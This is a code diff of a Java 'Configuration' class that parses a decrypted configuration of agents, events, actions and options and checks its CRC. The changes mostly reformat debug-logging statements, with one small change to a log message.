@@ -180,7 +180,8 @@ public class Configuration {
 		}
 
 		confHash = (int) tempHash;
-		if(Cfg.DEBUG) Check.log( TAG + " Configuration CRC: " + confHash);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Configuration CRC: " + confHash);
 		return confHash;
 	}
 
@@ -201,7 +202,8 @@ public class Configuration {
 			throw new GeneralException("Tag " + tag + " not found");
 		}
 
-		if(Cfg.DEBUG) Check.log( TAG + " Tag " + tag + " found at: " + index);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Tag " + tag + " found at: " + index);
 		return index;
 	}
 
@@ -226,7 +228,8 @@ public class Configuration {
 		final int agentNum = wrappedClearConf.getInt(agentTag);
 		wrappedClearConf.position(agentTag + 4);
 
-		if(Cfg.DEBUG) Check.log( TAG + " Number of agents: " + agentNum);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Number of agents: " + agentNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < agentNum; i++) {
@@ -240,15 +243,17 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			if(Cfg.DEBUG) Check.log( TAG + " Agent: " + id + " Enabled: " + enabled
-					+ " Params Len: " + plen);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Agent: " + id + " Enabled: " + enabled
+						+ " Params Len: " + plen);
 
 			AgentType type = AgentType.get(id);
 			if (type != null) {
 				final AgentConf a = new AgentConf(type, enabled, params);
 				status.addAgent(a);
 			} else {
-				if(Cfg.DEBUG) Check.log( TAG + " Error (loadAgents): null key");
+				if (Cfg.DEBUG)
+					Check.log(TAG + " Error (loadAgents): null key");
 			}
 		}
 
@@ -276,7 +281,8 @@ public class Configuration {
 		final int eventNum = wrappedClearConf.getInt(eventTag);
 		wrappedClearConf.position(eventTag + 4);
 
-		if(Cfg.DEBUG) Check.log( TAG + " Number of events: " + eventNum);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Number of events: " + eventNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < eventNum; i++) {
@@ -292,8 +298,9 @@ public class Configuration {
 
 			EventType type = EventType.get(typeId);
 
-			if(Cfg.DEBUG) Check.log( TAG + " Configuration.java Event: " + type
-					+ " Action: " + action + " Params Len: " + plen);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Configuration.java Event: " + type
+						+ " Action: " + action + " Params Len: " + plen);
 
 			final EventConf e = new EventConf(type, i, action, params);
 			status.addEvent(e);
@@ -315,7 +322,8 @@ public class Configuration {
 	private void loadActions() throws GeneralException {
 		final int actionNum = wrappedClearConf.getInt();
 
-		if(Cfg.DEBUG) Check.log( TAG + " Number of actions " + actionNum);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Number of actions " + actionNum);
 
 		try {
 			for (int i = 0; i < actionNum; i++) {
@@ -323,7 +331,8 @@ public class Configuration {
 
 				final Action a = new Action(i);
 
-				if(Cfg.DEBUG) Check.log( TAG + " Action " + i + " SubActions: " + subNum);
+				if (Cfg.DEBUG)
+					Check.log(TAG + " Action " + i + " SubActions: " + subNum);
 
 				for (int j = 0; j < subNum; j++) {
 					final int type = wrappedClearConf.getInt();
@@ -336,15 +345,15 @@ public class Configuration {
 					}
 
 					if (a.addSubAction(type, params)) {
-						if(Cfg.DEBUG) Check.log( TAG + " SubAction " + j + " Type: "
-								+ SubActionType.get(type) + " Params Length: "
-								+ plen);
+						if (Cfg.DEBUG)
+							Check.log(TAG + " SubAction " + j + " Type: "
+									+ type + " Params Length: " + plen);
 					}
-
 				}
 
-				if(Cfg.DEBUG) Check.ensures(a.getSubActionsNum() == subNum,
-						"inconsistent subaction number");
+				if (Cfg.DEBUG)
+					Check.ensures(a.getSubActionsNum() == subNum,
+							"inconsistent subaction number");
 
 				status.addAction(a);
 			}
@@ -376,7 +385,8 @@ public class Configuration {
 		final int optionsNum = wrappedClearConf.getInt(optionsTag);
 		wrappedClearConf.position(optionsTag + 4);
 
-		if(Cfg.DEBUG) Check.log( TAG + " Number of options: " + optionsNum);
+		if (Cfg.DEBUG)
+			Check.log(TAG + " Number of options: " + optionsNum);
 
 		// Get id, status, parameters length and parameters
 		for (int i = 0; i < optionsNum; i++) {
@@ -389,7 +399,8 @@ public class Configuration {
 				wrappedClearConf.get(params, 0, plen);
 			}
 
-			if(Cfg.DEBUG) Check.log( TAG + " Option: " + id + " Params Len: " + plen);
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Option: " + id + " Params Len: " + plen);
 
 			final Option o = new Option(id, params);
 			status.addOption(o);
@@ -444,7 +455,6 @@ public class Configuration {
 
 			final int confClearLen = this.wrappedClearConf.getInt();
 
-			
 			// Verify CRC
 			final int confCrc = this.wrappedClearConf.getInt(confClearLen - 4);
 
@@ -455,23 +465,27 @@ public class Configuration {
 			}
 
 			// Return decrypted conf
-			if(Cfg.DEBUG) Check.log( TAG + " Configuration is valid");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Configuration is valid");
 			return;
 		} catch (final IOException ioe) {
 			if (Cfg.DEBUG) {
 				Check.log(ioe);
 			}
-			if(Cfg.DEBUG) Check.log( TAG + " IOException() detected");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " IOException() detected");
 		} catch (final SecurityException se) {
 			if (Cfg.DEBUG) {
 				Check.log(se);
 			}
-			if(Cfg.DEBUG) Check.log( TAG + " SecurityException() detected");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " SecurityException() detected");
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(e);
 			}
-			if(Cfg.DEBUG) Check.log( TAG + " Exception() detected");
+			if (Cfg.DEBUG)
+				Check.log(TAG + " Exception() detected");
 		}
 
 		return;
